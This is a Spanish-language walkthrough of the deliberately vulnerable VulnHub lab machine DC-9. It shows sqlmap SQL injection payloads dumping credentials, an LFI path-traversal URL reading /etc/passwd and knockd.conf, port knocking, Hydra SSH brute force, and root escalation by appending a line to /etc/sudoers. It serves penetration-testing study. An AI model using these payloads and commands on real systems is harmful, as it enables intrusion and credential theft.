---
layout: post
title: DC 9 - Walkthrough
date: 2020-07-28 20:44
description: En esta VM se usará una inyección de SQL para encontrar algunas credenciales, después de aprovechará una vulnerabilidad de LFI para encontrar información en archivos de configuración del sistema, después de un port knocking un poco de fuerza bruta y a escalar privilegios hacia el root.
toc: true
comments: false
tags: 
 - OSCP
 - Walkthrough
 - VulnHub

---

## **Walkthrough de DC: 9**
---

![img]({{ '/assets/images/DC9/dc9_00.png' | relative_url }}){: .center-image }*(Descripción)*

---
En esta VM se usará una inyección de SQL para encontrar algunas credenciales, después de aprovechará una vulnerabilidad de LFI para encontrar información en archivos de configuración del sistema, después de un port knocking un poco de fuerza bruta y a escalar privilegios hacia el root.

---

## **Links**
[DC: 9 en VulnHub](https://www.vulnhub.com/entry/dc-9,412/)



## **Reconocimiento**
---
>**`nmap -A -T4 -p 80 10.10.10.151`**

```console
# Nmap 7.80 scan initiated Wed Jul 22 10:16:05 2020 as: nmap -A -T4 -p 80 -oA DC9 10.0.0.151
Nmap scan report for 10.0.0.151
Host is up (0.00053s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 22 10:16:13 2020 -- 1 IP address (1 host up) scanned in 8.04 seconds
```

Solo el puerto 80 está abierto, por el momento casi no hay posibilidad de una shell reversa. `Nikto` y `Dirb` no arrojan resultados relevantes.

La página ofrece cierta información importante sobre usuarios y una opción de login:

![img]({{ '/assets/images/DC9/dc9_01.png' | relative_url }}){: .center-image }*(Nombres de usuario)*

---

![img]({{ '/assets/images/DC9/dc9_02.png' | relative_url }}){: .center-image }*(Login)*

---

Al tener la página de búsqueda se puede usar `SQLMAP` para hacer un ataque de SQLi, como paso previo hay que hacer una captura del request HTTP que se hace al momento de hacer la búsqueda y guardarlo en un archivo (`request.req` o lo que sea), en este caso usé el módulo de proxy de `Burp Suite` y se ve así:

```console
POST /results.php HTTP/1.1
Host: 10.0.0.151
Content-Length: 10
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.0.0.151
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.0.0.151/search.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

search=asd
```

---
### **SQLMAP**

Ahora vamos directamente a `SQLMAP` usando la request que acabamos de capturar cómo parámetro:

>**``sqlmap -r request.req --dbms=mysql --dbs``**

```console
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.5#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:02:28 /2020-07-22/

[12:02:28] [INFO] parsing HTTP request from 'request.req'
[12:02:29] [INFO] testing connection to the target URL
[12:02:29] [INFO] testing if the target URL content is stable
[12:02:29] [INFO] target URL content is stable
[12:02:29] [INFO] testing if POST parameter 'search' is dynamic
[12:02:29] [WARNING] POST parameter 'search' does not appear to be dynamic
[12:02:29] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
[12:02:29] [INFO] testing for SQL injection on POST parameter 'search'
[12:02:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:02:30] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:02:30] [INFO] testing 'Generic inline queries'
[12:02:30] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[12:02:30] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[12:02:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:02:30] [WARNING] time-based comparison requires larger statistical model, please wait.............. (done)
[12:02:50] [INFO] POST parameter 'search' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[12:03:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:03:21] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[12:03:21] [INFO] target URL appears to be UNION injectable with 6 columns
[12:03:21] [INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=asd' AND (SELECT 4062 FROM (SELECT(SLEEP(5)))ryqh) AND 'NvLD'='NvLD

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=asd' UNION ALL SELECT NULL,NULL,CONCAT(0x717a786a71,0x524e496b5750636b75576d6167794b57574b7553714a61694c434147436b45656e6976525a524a78,0x71716a7871),NULL,NULL,NULL-- -
---
[12:03:22] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[12:03:22] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] Staff
[*] users
````
---

Al final del comando se puede ver que encontró tres bases:
* information_schema
* Staff
* users

Voy por la tabla `users` está vez, haciendo dump


> **``sqlmap -r request.req --dbms=mysql -D users --dump``**

```console
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.5#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:05:05 /2020-07-22/

[12:05:05] [INFO] parsing HTTP request from 'request.req'
[12:05:05] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=asd' AND (SELECT 4062 FROM (SELECT(SLEEP(5)))ryqh) AND 'NvLD'='NvLD

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=asd' UNION ALL SELECT NULL,NULL,CONCAT(0x717a786a71,0x524e496b5750636b75576d6167794b57574b7553714a61694c434147436b45656e6976525a524a78,0x71716a7871),NULL,NULL,NULL-- -
---
[12:05:05] [INFO] testing MySQL
[12:05:05] [INFO] confirming MySQL
[12:05:05] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[12:05:05] [INFO] fetching tables for database: 'users'
[12:05:06] [INFO] fetching columns for table 'UserDetails' in database 'users'
[12:05:06] [INFO] fetching entries for table 'UserDetails' in database 'users'
Database: users
Table: UserDetails
[17 entries]
+------+------------+---------------------+-----------+-----------+---------------+
| id   | lastname   | reg_date            | username  | firstname | password      |
+------+------------+---------------------+-----------+-----------+---------------+
| 7    | Flintstone | 2019-12-29 16:58:26 | wilmaf    | Wilma     | Pebbles       |
| 6    | Mouse      | 2019-12-29 16:58:26 | jerrym    | Jerry     | B8m#48sd      |
| 5    | Cat        | 2019-12-29 16:58:26 | tomc      | Tom       | TC&TheBoyz    |
| 4    | Rubble     | 2019-12-29 16:58:26 | barneyr   | Barney    | RocksOff      |
| 3    | Flintstone | 2019-12-29 16:58:26 | fredf     | Fred      | 4sfd87sfd1    |
| 2    | Dooley     | 2019-12-29 16:58:26 | julied    | Julie     | 468sfdfsd2    |
| 1    | Moe        | 2019-12-29 16:58:26 | marym     | Mary      | 3kfs86sfd     |
| 17   | Morrison   | 2019-12-29 16:58:28 | janitor2  | Scott     | Hawaii-Five-0 |
| 16   | Trump      | 2019-12-29 16:58:26 | janitor   | Donald    | Ilovepeepee   |
| 15   | McScoots   | 2019-12-29 16:58:26 | scoots    | Scooter   | YR3BVxxxw87   |
| 14   | Buffay     | 2019-12-29 16:58:26 | phoebeb   | Phoebe    | smellycats    |
| 13   | Geller     | 2019-12-29 16:58:26 | monicag   | Monica    | 3248dsds7s    |
| 12   | Geller     | 2019-12-29 16:58:26 | rossg     | Ross      | ILoveRachel   |
| 11   | Green      | 2019-12-29 16:58:26 | rachelg   | Rachel    | yN72#dsd      |
| 10   | Tribbiani  | 2019-12-29 16:58:26 | joeyt     | Joey      | Passw0rd      |
| 9    | Bing       | 2019-12-29 16:58:26 | chandlerb | Chandler  | UrAG0D!       |
| 8    | Rubble     | 2019-12-29 16:58:26 | bettyr    | Betty     | BamBam01      |
+------+------------+---------------------+-----------+-----------+---------------+

[12:05:06] [INFO] table 'users.UserDetails' dumped to CSV file '/home/pablog/.sqlmap/output/10.0.0.151/dump/users/UserDetails.csv'
[12:05:06] [INFO] fetched data logged to text files under '/home/pablog/.sqlmap/output/10.0.0.151'
[12:05:06] [WARNING] you haven't updated sqlmap for more than 81 days!!!

[*] ending @ 12:05:06 /2020-07-22/
```
---

Que lindo, me trajo todos los usuarios con sus respectivos passwords. Me imaginé que más adelante iba a tener que usarlos así que separé la tabla en dos archivos: **user y password** ¿A ver que tiene la tabla `Staff`?

> **``sqlmap -r request.req --dbms=mysql -D Staff --dump``**

```console
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.5#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:10:34 /2020-07-22/

[12:10:34] [INFO] parsing HTTP request from 'request.req'
[12:10:35] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=asd' AND (SELECT 4062 FROM (SELECT(SLEEP(5)))ryqh) AND 'NvLD'='NvLD

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=asd' UNION ALL SELECT NULL,NULL,CONCAT(0x717a786a71,0x524e496b5750636b75576d6167794b57574b7553714a61694c434147436b45656e6976525a524a78,0x71716a7871),NULL,NULL,NULL-- -
---
[12:10:35] [INFO] testing MySQL
[12:10:35] [INFO] confirming MySQL
[12:10:35] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[12:10:35] [INFO] fetching tables for database: 'Staff'
[12:10:35] [INFO] fetching columns for table 'StaffDetails' in database 'Staff'
[12:10:35] [INFO] fetching entries for table 'StaffDetails' in database 'Staff'
Database: Staff
Table: StaffDetails
[17 entries]
+------+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+
| id   | email                 | phone          | lastname   | reg_date            | firstname | position                      |
+------+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+
| 5    | tomc@example.com      | 802438797      | Cat        | 2019-05-01 17:32:00 | Tom       | Driver                        |
| 10   | joeyt@example.com     | 232131654      | Tribbiani  | 2019-05-01 17:32:00 | Joey      | Janitor                       |
| 15   | scoots@example.com    | 454786464      | McScoots   | 2019-05-01 20:16:33 | Scooter   | Resident Cat                  |
| 3    | fredf@example.com     | 46415323       | Flintstone | 2019-05-01 17:32:00 | Fred      | Systems Administrator         |
| 8    | bettyr@example.com    | 90239724378    | Rubble     | 2019-05-01 17:32:00 | Betty     | Junior Accounts               |
| 13   | monicag@example.com   | 8092432798     | Geller     | 2019-05-01 17:32:00 | Monica    | Marketing                     |
| 1    | marym@example.com     | 46478415155456 | Moe        | 2019-05-01 17:32:00 | Mary      | CEO                           |
| 6    | jerrym@example.com    | 24342654756    | Mouse      | 2019-05-01 17:32:00 | Jerry     | Stores                        |
| 11   | rachelg@example.com   | 823897243978   | Green      | 2019-05-01 17:32:00 | Rachel    | Personal Assistant            |
| 16   | janitor@example.com   | 65464646479741 | Trump      | 2019-12-23 03:11:39 | Donald    | Replacement Janitor           |
| 4    | barneyr@example.com   | 324643564      | Rubble     | 2019-05-01 17:32:00 | Barney    | Help Desk                     |
| 9    | chandlerb@example.com | 189024789      | Bing       | 2019-05-01 17:32:00 | Chandler  | President - Sales             |
| 14   | phoebeb@example.com   | 43289079824    | Buffay     | 2019-05-01 17:32:02 | Phoebe    | Assistant Janitor             |
| 2    | julied@example.com    | 46457131654    | Dooley     | 2019-05-01 17:32:00 | Julie     | Human Resources               |
| 7    | wilmaf@example.com    | 243457487      | Flintstone | 2019-05-01 17:32:00 | Wilma     | Accounts                      |
| 12   | rossg@example.com     | 6549638203     | Geller     | 2019-05-01 17:32:00 | Ross      | Instructor                    |
| 17   | janitor2@example.com  | 47836546413    | Morrison   | 2019-12-24 03:41:04 | Scott     | Assistant Replacement Janitor |
+------+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+

[12:10:35] [INFO] table 'Staff.StaffDetails' dumped to CSV file '/home/pablog/.sqlmap/output/10.0.0.151/dump/Staff/StaffDetails.csv'
[12:10:35] [INFO] fetching columns for table 'Users' in database 'Staff'
[12:10:36] [INFO] fetching entries for table 'Users' in database 'Staff'
[12:10:36] [INFO] recognized possible password hashes in column '`Password`'

do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: Staff
Table: Users
[1 entry]
+--------+----------+----------------------------------+
| UserID | Username | Password                         |
+--------+----------+----------------------------------+
| 1      | admin    | 856f5de590ef37314e7c3bdf6f8a66dc |
+--------+----------+----------------------------------+
```
---

Con un poquito de ataque de diccionario, `SQLMAP` logra extraer el hash del usuario admin en MD5. Buscando ese hash en cualquier sitio de cracks de hashes se encuentra que el password del usuario admin es `transorbital1` así que volviendo a la página me puedo loguear exitosamente.

![img]({{ '/assets/images/DC9/dc9_03.png' | relative_url }}){: .center-image }*(Admin logueado)*

---

Ok, no hay mucho para hacer a pesar de estar logueado aunque es llamativo el error que se muestra abajo sobre que no existe un archivo, esto es una pista hacia un LFI. Yendo con la misma prueba de siempre:

---
![img]({{ '/assets/images/DC9/dc9_06.png' | relative_url }}){: .center-image }*(LFI)*
---

```
http://10.0.0.151/manage.php?file=/../../../../../etc/passwd
```


![img]({{ '/assets/images/DC9/dc9_04.png' | relative_url }}){: .center-image }*(LFI)*

Que lindo, tenemos capacidad de hacer LFI sobre la VM pero ¿Que más se puede hacer?. La verdad que a esto no lo habría encontrado en un millon de años, el archivo importante a acceder es la configuración de **port knocking** que también está en `/etc`:

```console
http://10.0.0.151/welcome.php?file=../../../../etc/knockd.conf
```

![img]({{ '/assets/images/DC9/dc9_05.png' | relative_url }}){: .center-image }*(port knocking)*

Lo que muestra el archivo es que si hacemos knock en los puertos `7469`, `8475` y `9842` se debería abrir el puerto 22 de `ssh`. Hay varias formas de hacer port knocking:

```console
nmap -Pn --host-timeout 500 --max-retries 0 -p 7469 10.0.0.151 \
nmap -Pn --host-timeout 500 --max-retries 0 -p 8475 10.0.0.151 \
nmap -Pn --host-timeout 500 --max-retries 0 -p 9842 10.0.0.151
```

Pero a mi me funcionó la más atada con alambre, `nc`:

```console
pablog@Link:~/Downloads/DC9$ nc 10.0.0.151 7469
(UNKNOWN) [10.0.0.151] 7469 (?) : Connection refused
pablog@Link:~/Downloads/DC9$ nc 10.0.0.151 8475
(UNKNOWN) [10.0.0.151] 8475 (?) : Connection refused
pablog@Link:~/Downloads/DC9$ nc 10.0.0.151 9842
(UNKNOWN) [10.0.0.151] 9842 (?) : Connection refused
pablog@Link:~/Downloads/DC9$ nc 10.0.0.151 22
```
Si todo sale bien, el puerto 22 ahora responde y se puede empezar a atacarlo con los usuarios y passwords que se recolectaron.

> **``hydra -L user -P passwords 10.0.0.151 ssh -F -V -t 4``**

```console
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-24 19:33:18
[DATA] max 4 tasks per 1 server, overall 4 tasks, 289 login tries (l:17/p:17), ~73 tries per task
[DATA] attacking ssh://10.0.0.151:22/
[ATTEMPT] target 10.0.0.151 - login "marym" - pass "Pebbles" - 1 of 289 [child 0] (0/0)
[ATTEMPT] target 10.0.0.151 - login "marym" - pass "B8m#48sd" - 2 of 289 [child 1] (0/0)
[ATTEMPT] target 10.0.0.151 - login "marym" - pass "TC&TheBoyz" - 3 of 289 [child 2] (0/0)
[ATTEMPT] target 10.0.0.151 - login "marym" - pass "RocksOff" - 4 of 289 [child 3] (0/0)
[ATTEMPT] target 10.0.0.151 - login "marym" - pass "4sfd87sfd1" - 5 of 289 [child 1] (0/0)
[ATTEMPT] target 10.0.0.151 - login "marym" - pass "468sfdfsd2" - 6 of 289 [child 2] (0/0)
[ATTEMPT] target 10.0.0.151 - login "marym" - pass "3kfs86sfd" - 7 of 289 [child 0] (0/0)
---snip---
[ATTEMPT] target 10.0.0.151 - login "chandlerb" - pass "Passw0rd" - 151 of 289 [child 2] (0/0)
[ATTEMPT] target 10.0.0.151 - login "chandlerb" - pass "UrAG0D!" - 152 of 289 [child 1] (0/0)
[22][ssh] host: 10.0.0.151   login: chandlerb   password: UrAG0D!
[STATUS] attack finished for 10.0.0.151 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```
Se encuentran dos usuarios con password correctos:
* Usuario: chandlerb   password: **UrAG0D!**
* Usuario: janitor     password: **Ilovepeepee**

El usuario ``chandlerb`` era un rabbit hole pero ``janitor`` tenía un directorio oculto dentro de su carpeta de home llamado ``.secrets-for-putin`` jua jua. Ese directorio contenía un archivo llamado `` passwords-found-on-post-it-notes.txt`` con el siguiente contenido:

```console
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```
---

De nuevo a ``Hydra`` con los nuevos passwords:

> **`` hydra -L user -P password_2 10.0.0.151 ssh``**

```console
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-24 20:57:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 102 login tries (l:17/p:6), ~7 tries per task
[DATA] attacking ssh://10.0.0.151:22/
[22][ssh] host: 10.0.0.151   login: fredf   password: B4-Tru3-001
[22][ssh] host: 10.0.0.151   login: joeyt   password: Passw0rd
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-24 20:57:48
```
Se encuentran dos usuarios más:
* Usuario: fredf   password: **B4-Tru3-001**
* Usuario: joeyt   password: **Passw0rd**

---

Finalmente, el usuario fredf arroja un resultado al correr el comando ``sudo -l``:

```console
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
```

Se puete correr el comando ``/opt/devstuff/dist/test/test``, el contenido del script de Python que se puede ejecutar es el siguiente:

```python
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
```
Simple, hay que ejecutarlo pasandole dos archivos cómo parámetros. El primer argumento lee un archivo y agrega su contenido al archivo que se le pasa como segundo parámetro. Esto significa que al hacer sudo y correr este script podemos leer cualquier archivo del sistema operativo, se me ocurren dos cosas que se pueden hacer:

* Agregar un usuario a ``/etc/passwd`` con privilegios de root.
* Agregar cualquier usuario ya existente a  ``/etc/sudoers`` con todos los privilegios.

Fui por la segunda opción.

---

## **Escalamiento de privilegios**

Lo primero que hay que hacer es agregar la información que queremos a un archivo cualquiera, en este caso ``/tmp/fredf``:


> **``echo "fredf ALL=(ALL:ALL) ALL" > /tmp/fred``**

Después se se corre el comando:

> **``sudo /opt/devstuff/dist/test/test /tmp/fred /etc/sudoers``**

Si todo salió bien se puede ejecutar cualquier comando con sudo, en este caso ``sudo su``:

```console
fredf@dc-9:~$ sudo su
[sudo] password for fredf:
root@dc-9:/home/fredf# id
uid=0(root) gid=0(root) groups=0(root)
```
---

## **Flag**

```console
cat theflag.txt


███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝

Congratulations - you have done well to get to this point.

Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
who have taken the time to complete the various DC challenges.

I also want to send out a big thank you to the various members of @m0tl3ycr3w .

They are an inspirational bunch of fellows.

Sure, they might smell a bit, but...just kidding.  :-)

Sadly, all things must come to an end, and this will be the last ever
challenge in the DC series.

So long, and thanks for all the fish.
```
---
